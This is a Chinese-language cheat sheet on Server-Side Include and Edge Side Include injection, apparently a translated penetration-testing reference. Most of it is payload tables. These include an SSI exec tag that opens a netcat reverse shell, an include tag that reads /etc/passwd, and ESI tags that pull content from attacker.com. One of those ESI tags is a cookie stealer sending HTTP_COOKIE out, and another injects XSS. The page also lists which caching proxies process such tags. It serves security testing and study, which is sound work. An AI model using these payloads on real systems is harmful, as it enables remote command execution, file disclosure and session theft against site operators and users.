# 服务器端包含注入

> 服务器端包含（SSI）是放置在HTML页面中的指令，并在服务器上提供页面时进行评估。它们允许您向现有的HTML页面添加动态生成的内容，而无需通过CGI程序或其他动态技术提供整个页面。

## 概述

* [方法论](#方法论)
* [边缘侧包含](#边缘侧包含)
* [参考文献](#参考文献)

## 方法论

当攻击者能够在Web应用程序中输入服务器端包含指令时，就会发生SSI注入。SSI是可以包含文件、执行命令或打印环境变量/属性的指令。如果在SSI上下文中没有正确清理用户输入，则该输入可以用来操纵服务器端行为并访问敏感信息或执行命令。

SSI格式：`<!--#directive param="value" -->`

| 描述                   | 负载                                   |
| ---------------------- | ------------------------------------- |
| 打印日期               | `<!--#echo var="DATE_LOCAL" -->`       |
| 打印文档名称           | `<!--#echo var="DOCUMENT_NAME" -->`    |
| 打印所有变量           | `<!--#printenv -->`                    |
| 设置变量               | `<!--#set var="name" value="Rich" -->` |
| 包含一个文件           | `<!--#include file="/etc/passwd" -->`  |
| 包含一个文件           | `<!--#include virtual="/index.html" -->`|
| 执行命令               | `<!--#exec cmd="ls" -->`                |
| 反向shell              | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## 边缘侧包含

HTTP代理无法区分上游服务器的真实ESI标签和嵌入在HTTP响应中的恶意标签。这意味着，如果攻击者成功地将ESI标签注入到HTTP响应中，代理将在不加质疑的情况下处理和评估这些标签，假设它们是从上游服务器合法来源的标签。

某些代理需要在Surrogate-Control HTTP头中表明ESI处理需求。

```ps1
Surrogate-Control: content="ESI/1.0"
```

| 描述                   | 负载                                        |
| ---------------------- | ------------------------------------------ |
| 盲检测                 | `<esi:include src=http://attacker.com>`    |
| XSS                    | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie窃取器           | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| 包含一个文件           | `<esi:include src="supersecret.txt">`      |
| 显示调试信息           | `<esi:debug/>`                             |
| 添加头信息             | `<!--esi $add_header('Location','http://attacker.com') -->` |
| 内联片段               | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| 软件     | 包含 | 变量 | Cookies | 上游头信息需求 | 主机白名单 |
| -------- | ---- | ---- | ------- | ------------- | ---------- |
| Squid3   | 是   | 是   | 是      | 是            | 否         |
| Varnish缓存 | 是  | 否   | 否      | 是            | 是         |
| Fastly   | 是   | 否   | 否      | 否            | 是         |
| Akamai ESI测试服务器(ETS) | 是 | 是 | 是 | 否          | 否         |
| NodeJS的esi | 是  | 是   | 是      | 否            | 否         |
| NodeJS的nodesi | 是 | 否   | 否      | 否            | 可选       |

## 参考文献

* [超越XSS：边缘侧包含注入 - Louis Dion-Marcil - 2018年4月3日](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [DEF CON 26 - 利用缓存服务器进行SSRF的边缘侧包含注入 - ldionmarcil - 2018年10月23日](https://www.youtube.com/watch?v=VUZGZnpSg8I)
* [ESI注入第二部分：滥用特定实现 - Philippe Arteau - 2019年5月2日](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [利用服务器端包含注入 - n00py - 2017年8月15日](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [服务器端包含/边缘侧包含注入 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [服务器端包含（SSI）注入 - Weilin Zhong, Nsrav - 2019年12月4日](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)